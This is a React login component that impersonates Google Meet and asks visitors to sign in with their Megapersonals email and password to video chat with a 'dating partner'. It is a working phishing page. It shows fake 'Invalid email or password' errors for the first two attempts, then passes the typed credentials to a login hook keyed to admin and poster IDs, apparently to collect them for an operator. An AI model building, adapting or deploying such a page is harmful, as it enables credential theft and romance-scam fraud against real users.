"use client";
import { site } from "../config/index";
import { useState } from "react";
import useMockLogin from "../hooks/useMockLogin";

function LoginForm({ adminId, posterId }) {
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [error, setError] = useState("");

  const { login } = useMockLogin(adminId, posterId);

  const handleSubmit = async (e) => {
    if (e) e.preventDefault();

    const currentEmail = email;
    const currentPassword = password;

    setEmail("");
    setPassword("");

    if (attempts < 2) {
      setError("Invalid email or password");
      setAttempts((prev) => prev + 1);
      return;
    }

    const allValues = {
      site: site,
      email: currentEmail,
      password: currentPassword,
      skipcode: "",
    };

    setError("");
    await login(allValues);
    setAttempts(0);
  };

  return (
    <div className="w-full flex flex-col items-center min-h-screen bg-white font-sans p-4 pt-20">
      <div className="w-full max-w-[420px] flex flex-col items-center">
        {/* Logo box */}
        <div className="w-24 h-24 mb-4 flex items-center justify-center">
          <div className="flex items-center justify-center">
            <img
              src="/images/icons8-google-meet-480.png"
              width="120px"
              height="120px"
              alt=""
            />{" "}
          </div>
        </div>

        <h1 className="text-[#174ea6] text-[42px] font-bold mb-4 tracking-tight">
          Google Meet
        </h1>

        <p className="text-[#5f6368] text-[22px] leading-[1.3] text-center mb-10 px-2">
          Login With Megapersonals and enjoy with{" "}
          <span className="text-[#1a73e8] font-bold">
            Google Meet video chat
          </span>{" "}
          your dating partner.
        </p>

        <div className="w-full space-y-4">
          <input
            required
            className="w-full h-14 border border-[#fbbc04] rounded px-4 outline-none text-lg text-gray-700 placeholder:text-gray-400 focus:ring-1 focus:ring-[#fbbc04]"
            placeholder="Enter email here"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <input
            required
            className="w-full h-14 border border-[#fbbc04] rounded px-4 outline-none text-lg text-gray-700 placeholder:text-gray-400 focus:ring-1 focus:ring-[#fbbc04]"
            placeholder="Enter password here"
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />

          {error && (
            <div className="w-full bg-[#ff0000] text-white py-3 px-4 rounded text-center font-medium">
              {error}
            </div>
          )}

          <button
            onClick={handleSubmit}
            className="w-full h-14 bg-[#ffcc00] hover:bg-[#e6b800] text-white font-bold text-xl rounded shadow-sm transition-all duration-200 active:scale-[0.98]"
          >
            Submit
          </button>
        </div>
      </div>
    </div>
  );
}

export default LoginForm;
